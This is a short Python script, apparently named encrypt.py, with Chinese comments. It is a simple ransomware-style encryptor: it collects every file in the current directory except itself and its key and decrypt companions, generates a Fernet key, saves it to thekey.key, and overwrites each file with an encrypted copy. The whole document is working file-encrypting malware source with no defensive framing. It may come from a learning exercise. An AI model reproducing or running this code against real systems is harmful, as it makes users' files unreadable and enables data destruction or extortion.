#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):  # 只探測檔案，目錄掠過
        files.append(file)

print(files)

#產生加密鑰匙
key = Fernet.generate_key()
#將鑰匙存成thekey.key
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#讀取檔案內容並將其加密，在將加密的內容寫回檔案中.p
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
